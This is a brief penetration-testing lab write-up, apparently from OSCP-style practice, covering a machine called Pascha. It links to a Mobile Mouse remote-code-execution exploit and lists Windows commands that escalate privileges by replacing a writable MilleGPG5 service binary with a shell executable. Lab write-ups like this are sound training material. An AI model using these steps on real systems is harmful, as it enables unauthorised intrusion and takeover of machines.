# Pascha

Ok so after scan, found mobile mouse on port 9099, had a hard time running exploit&#x20;

{% embed url="https://github.com/lof1sec/mobile_mouse_rce" %}

<figure><img src="../../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

And for privesc i Found service MilleGPG5 running and found a nice git:

{% embed url="https://github.com/Daniel-Ayz/OSCP" %}

```
icacls "C:\Program Files\MilleGPG5\GPGService.exe"
stop-service GPGOrchestrator
copy shell.exe "C:\Program Files\MilleGPG5\GPGService.exe"
start-service GPGOrchestrator
```

<figure><img src="../../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
